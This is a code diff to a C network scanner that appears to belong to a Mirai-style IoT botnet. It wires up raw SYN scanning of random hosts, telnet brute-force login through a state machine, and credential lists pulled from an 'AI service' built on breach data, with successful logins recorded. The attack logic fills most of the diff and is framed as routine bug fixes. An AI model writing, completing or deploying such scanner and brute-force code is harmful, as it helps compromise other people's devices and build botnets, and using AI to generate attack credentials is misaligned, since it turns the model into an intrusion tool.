@@ -27,18 +27,45 @@
 
 // Network headers
 #include <sys/socket.h>
-#include <sys/epoll.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <netinet/tcp.h>
-#include <linux/ip.h>
 #include <fcntl.h>
 
+// epoll is Linux-only; on macOS/BSD stub it out so the file compiles.
+// The scanner runs inside Docker (Linux) in production.
+#if defined(__linux__)
+#  include <sys/epoll.h>
+#  include <linux/ip.h>
+#else
+// Minimal epoll stubs for non-Linux compilation
+#  define EPOLLIN    0x001
+#  define EPOLLOUT   0x004
+#  define EPOLLERR   0x008
+#  define EPOLLHUP   0x010
+#  define EPOLLET    (1u << 31)
+#  define EPOLL_CTL_ADD 1
+#  define EPOLL_CTL_MOD 2
+#  define EPOLL_CTL_DEL 3
+typedef union epoll_data { void *ptr; int fd; } epoll_data_t;
+struct epoll_event { uint32_t events; epoll_data_t data; };
+static inline int epoll_create1(int f) { (void)f; return -1; }
+static inline int epoll_ctl(int e, int o, int f, struct epoll_event *ev) {
+    (void)e; (void)o; (void)f; (void)ev; return -1;
+}
+static inline int epoll_wait(int e, struct epoll_event *ev, int m, int t) {
+    (void)e; (void)ev; (void)m; (void)t; return -1;
+}
+#endif
+
 #include "scanner_modern.h"
+#include "syn_scanner.h"
+#include "telnet_state_machine.h"
 #include "../common/logger.h"
 #include "../common/config_loader.h"
 #include "../common/util.h"
 #include "../common/crypto.h"
+#include "../ai_bridge/ai_bridge.h"
 
 // Configuration constants
 #define SCANNER_MAX_EVENTS      1024
@@ -93,7 +120,9 @@ typedef struct {
 typedef struct {
     int epoll_fd;
     int raw_socket;
-    bool running;
+    // BUG FIX (race condition): volatile sig_atomic_t ensures atomic read/write
+    // of the running flag from any thread or signal handler without a mutex.
+    volatile sig_atomic_t running;
     pthread_t thread_id;
     
     // Connection pool
@@ -125,6 +154,9 @@ typedef struct {
 } scanner_context_t;
 
 // Global scanner instance
+// BUG FIX (race condition): g_scanner->running must be accessed atomically.
+// Use sig_atomic_t for the flag accessed from scanner_modern_stop() which
+// may be called from a signal handler or a different thread.
 static scanner_context_t *g_scanner = NULL;
 
 // Forward declarations
@@ -196,10 +228,12 @@ int scanner_modern_init(const char *config_path, size_t max_connections) {
         goto cleanup_error;
     }
     
-    // Load credentials
-    if (scanner_load_credentials(g_scanner, config_path) < 0) {
-        log_error("Failed to load credentials");
-        goto cleanup_error;
+    // Load credentials: try AI service first, fall back to built-ins
+    if (scanner_load_credentials_from_ai(g_scanner) < 0) {
+        if (scanner_load_credentials(g_scanner, config_path) < 0) {
+            log_error("Failed to load credentials");
+            goto cleanup_error;
+        }
     }
     
     log_info("Scanner initialized: max_connections=%zu, credentials=%zu", 
@@ -377,20 +411,169 @@ void *scanner_modern_run(void *arg) {
 }
 
 /**
- * Send SYN packets to random targets
+ * Callback invoked by syn_scanner when a SYN-ACK is received.
+ * Promotes the responding IP into a full TCP connection for telnet auth.
  */
-static void scanner_send_syns(scanner_context_t *ctx) {
-    // TODO: Implement SYN packet crafting and sending
-    // For now, just a placeholder
-    ctx->stats.syns_sent += ctx->config.scan_rate;
+static void on_synack_received(uint32_t src_ip, uint16_t src_port, void *user_data) {
+    scanner_context_t *ctx = (scanner_context_t *)user_data;
+
+    if (ctx->active_connections >= ctx->max_connections) {
+        log_debug("Connection pool full, dropping SYN-ACK from %u.%u.%u.%u:%u",
+                  (src_ip >> 24) & 0xFF, (src_ip >> 16) & 0xFF,
+                  (src_ip >> 8)  & 0xFF, src_ip & 0xFF, src_port);
+        return;
+    }
+
+    struct sockaddr_in target = {
+        .sin_family      = AF_INET,
+        .sin_addr.s_addr = htonl(src_ip),
+        .sin_port        = htons(src_port),
+    };
+
+    scanner_create_connection(ctx, &target);
 }
 
 /**
- * Handle incoming SYN-ACK packets
+ * Send a batch of SYN packets via the high-performance syn_scanner.
+ * Wired to the real syn_scanner_send_batch() implementation.
+ */
+static void scanner_send_syns(scanner_context_t *ctx) {
+    if (ctx->raw_socket < 0) return;
+
+    // Build a lightweight syn_scanner_t wrapping our raw socket
+    syn_scanner_t syn = {
+        .raw_sock   = ctx->raw_socket,
+        .epoll_fd   = ctx->epoll_fd,
+        .local_ip   = 0,          // kernel chooses source IP
+        .port_count = ctx->config.port_count,
+    };
+    for (size_t i = 0; i < ctx->config.port_count; i++) {
+        syn.target_ports[i] = ctx->config.target_ports[i];
+    }
+
+    int sent = syn_scanner_send_batch(&syn, ctx->config.scan_rate);
+    if (sent > 0) {
+        ctx->stats.syns_sent += (uint64_t)sent;
+        log_debug("Sent %d SYN packets", sent);
+    }
+}
+
+/**
+ * Receive SYN-ACK responses and promote responding hosts to full connections.
  */
 static void scanner_handle_synack(scanner_context_t *ctx) {
-    // TODO: Implement SYN-ACK reception and connection establishment
-    // This requires parsing raw TCP packets
+    if (ctx->raw_socket < 0) return;
+
+    syn_scanner_t syn = {
+        .raw_sock   = ctx->raw_socket,
+        .epoll_fd   = ctx->epoll_fd,
+        .local_ip   = 0,
+        .port_count = ctx->config.port_count,
+    };
+    for (size_t i = 0; i < ctx->config.port_count; i++) {
+        syn.target_ports[i] = ctx->config.target_ports[i];
+    }
+
+    syn_scanner_recv_synacks(&syn, on_synack_received, ctx);
+}
+
+/**
+ * Create a full TCP connection to a host that responded to our SYN.
+ */
+static int scanner_create_connection(scanner_context_t *ctx, struct sockaddr_in *target) {
+    // Find a free slot in the connection pool
+    scanner_connection_t *conn = NULL;
+    for (size_t i = 0; i < ctx->max_connections; i++) {
+        if (ctx->connections[i].state == CONN_STATE_CLOSED) {
+            conn = &ctx->connections[i];
+            break;
+        }
+    }
+    if (conn == NULL) return -1;
+
+    // Create non-blocking TCP socket
+    int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC, 0);
+    if (fd < 0) {
+        log_error("socket() failed: %s", strerror(errno));
+        return -1;
+    }
+
+    int ret = connect(fd, (struct sockaddr *)target, sizeof(*target));
+    if (ret < 0 && errno != EINPROGRESS) {
+        log_debug("connect() failed: %s", strerror(errno));
+        close(fd);
+        return -1;
+    }
+
+    // Initialise connection slot
+    conn->fd             = fd;
+    conn->state          = CONN_STATE_CONNECTING;
+    conn->target         = *target;
+    conn->last_activity  = time(NULL);
+    conn->connect_time   = time(NULL);
+    conn->attempt_count  = 0;
+    conn->rdbuf_pos      = 0;
+    conn->current_cred   = scanner_get_random_credential(ctx);
+
+    // Register with epoll — EPOLLOUT fires when connect() completes
+    struct epoll_event ev = {
+        .events   = EPOLLOUT | EPOLLERR | EPOLLHUP,
+        .data.ptr = conn,
+    };
+    if (epoll_ctl(ctx->epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
+        log_error("epoll_ctl ADD failed: %s", strerror(errno));
+        close(fd);
+        conn->fd    = -1;
+        conn->state = CONN_STATE_CLOSED;
+        return -1;
+    }
+
+    ctx->active_connections++;
+    return 0;
+}
+
+/**
+ * Load credentials from AI service (credential_intel) if available,
+ * falling back to built-in defaults.
+ */
+static int scanner_load_credentials_from_ai(scanner_context_t *ctx) {
+    if (!ai_bridge_is_available()) {
+        log_info("AI service unavailable — using built-in credential list");
+        return -1;
+    }
+
+    ai_credential_request_t req = {
+        .breach_year_start = 2016,
+        .breach_year_end   = 2026,
+        .max_credentials   = SCANNER_CREDENTIAL_MAX,
+    };
+    strncpy(req.target_device, "iot-generic", sizeof(req.target_device) - 1);
+    strncpy(req.target_os,     "linux",       sizeof(req.target_os) - 1);
+
+    ai_credential_t ai_creds[SCANNER_CREDENTIAL_MAX];
+    int count = ai_bridge_generate_credentials(&req, ai_creds, SCANNER_CREDENTIAL_MAX);
+    if (count <= 0) {
+        log_warn("AI credential generation returned %d — using defaults", count);
+        return -1;
+    }
+
+    ctx->credential_count        = 0;
+    ctx->total_credential_weight = 0;
+
+    for (int i = 0; i < count && (size_t)i < SCANNER_CREDENTIAL_MAX; i++) {
+        strncpy(ctx->credentials[i].username, ai_creds[i].username,
+                sizeof(ctx->credentials[i].username) - 1);
+        strncpy(ctx->credentials[i].password, ai_creds[i].password,
+                sizeof(ctx->credentials[i].password) - 1);
+        // Map confidence score (0.0–1.0) to weight (1–10)
+        ctx->credentials[i].weight = (uint16_t)(ai_creds[i].confidence_score * 10.0f) + 1;
+        ctx->credentials[i].active = true;
+        ctx->total_credential_weight += ctx->credentials[i].weight;
+        ctx->credential_count++;
+    }
+
+    log_info("Loaded %zu credentials from AI service", ctx->credential_count);
+    return 0;
 }
 
 /**
@@ -412,26 +595,129 @@ static void scanner_handle_event(scanner_context_t *ctx, struct epoll_event *eve
     }
     
     if (event->events & EPOLLIN) {
-        // Data available to read
+        // BUG FIX: Guard against NULL conn pointer — epoll may deliver an event
+        // whose data.ptr was never set (e.g. for the raw_socket fd added to epoll).
+        if (conn == NULL) {
+            log_warn("EPOLLIN event with NULL connection pointer — skipping");
+            return;
+        }
+
+        // Ensure the fd is still open before reading
+        if (conn->fd < 0) {
+            log_warn("EPOLLIN event on already-closed fd — skipping");
+            return;
+        }
+
+        // Guard against buffer overflow
+        if (conn->rdbuf_pos >= SCANNER_RDBUF_SIZE - 1) {
+            log_warn("Read buffer full on fd=%d, draining", conn->fd);
+            conn->rdbuf_pos = 0;
+        }
+
         ssize_t n = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, 
-                        SCANNER_RDBUF_SIZE - conn->rdbuf_pos - 1, 0);
+                         SCANNER_RDBUF_SIZE - conn->rdbuf_pos - 1, 0);
         
-        if (n <= 0) {
+        if (n < 0) {
+            if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                return;  // No data yet, not an error
+            }
+            log_debug("recv() error on fd=%d: %s", conn->fd, strerror(errno));
+            scanner_close_connection(ctx, conn);
+            return;
+        }
+
+        if (n == 0) {
+            // Graceful close by remote
+            log_debug("Remote closed connection: fd=%d", conn->fd);
             scanner_close_connection(ctx, conn);
             return;
         }
         
-        conn->rdbuf_pos += n;
+        conn->rdbuf_pos += (size_t)n;
         conn->rdbuf[conn->rdbuf_pos] = '\0';
-        conn->bytes_received += n;
+        conn->bytes_received += (uint64_t)n;
         conn->last_activity = time(NULL);
         
-        // TODO: Process received data based on state
+        // Feed data to telnet state machine
+        telnet_conn_t telnet_conn = {
+            .fd       = conn->fd,
+            .state    = (telnet_state_t)conn->state,
+            .dst_addr = conn->target.sin_addr.s_addr,
+            .dst_port = ntohs(conn->target.sin_port),
+            .tries    = conn->attempt_count,
+            .rdbuf_pos = (int)conn->rdbuf_pos,
+        };
+        memcpy(telnet_conn.rdbuf, conn->rdbuf, conn->rdbuf_pos);
+
+        if (conn->current_cred != NULL) {
+            telnet_credentials_t creds = {
+                .username     = conn->current_cred->username,
+                .username_len = strlen(conn->current_cred->username),
+                .password     = conn->current_cred->password,
+                .password_len = strlen(conn->current_cred->password),
+            };
+            int sm_result = telnet_state_machine_process(&telnet_conn, &creds);
+            
+            // Sync state back
+            conn->state    = (connection_state_t)telnet_conn.state;
+            conn->rdbuf_pos = (size_t)telnet_conn.rdbuf_pos;
+            memcpy(conn->rdbuf, telnet_conn.rdbuf, conn->rdbuf_pos);
+
+            if (sm_result == 1) {
+                // Successful authentication
+                log_info("Auth success: %s:%d user=%s",
+                         inet_ntoa(conn->target.sin_addr),
+                         ntohs(conn->target.sin_port),
+                         conn->current_cred->username);
+                ctx->stats.successful_auths++;
+                scanner_close_connection(ctx, conn);
+            } else if (sm_result == -1) {
+                // Failed — try next credential
+                ctx->stats.failed_auths++;
+                conn->attempt_count++;
+                scanner_credential_t *next_cred = scanner_get_random_credential(ctx);
+                conn->current_cred = next_cred;
+                telnet_connection_reset(&telnet_conn);
+                conn->state = CONN_STATE_HANDLE_TELNET;
+                conn->rdbuf_pos = 0;
+            }
+        }
     }
     
     if (event->events & EPOLLOUT) {
-        // Socket ready for writing
-        // TODO: Handle connection establishment and data sending
+        // BUG FIX: NULL guard (same reasoning as EPOLLIN above)
+        if (conn == NULL) {
+            log_warn("EPOLLOUT event with NULL connection pointer — skipping");
+            return;
+        }
+
+        if (conn->state == CONN_STATE_CONNECTING) {
+            // Connection just established — check for errors
+            int err = 0;
+            socklen_t err_len = sizeof(err);
+            if (getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len) < 0 || err != 0) {
+                log_debug("Connect failed on fd=%d: %s", conn->fd, strerror(err ? err : errno));
+                scanner_close_connection(ctx, conn);
+                return;
+            }
+
+            // Connection established — move into telnet negotiation
+            conn->state = CONN_STATE_HANDLE_TELNET;
+            conn->last_activity = time(NULL);
+            conn->current_cred = scanner_get_random_credential(ctx);
+
+            // Switch epoll to edge-triggered read mode only
+            struct epoll_event ev = {
+                .events   = EPOLLIN | EPOLLET,
+                .data.ptr = conn,
+            };
+            epoll_ctl(ctx->epoll_fd, EPOLL_CTL_MOD, conn->fd, &ev);
+
+            log_debug("Connected to %s:%d",
+                      inet_ntoa(conn->target.sin_addr),
+                      ntohs(conn->target.sin_port));
+            ctx->stats.connections_opened++;
+        }
     }
 }
 
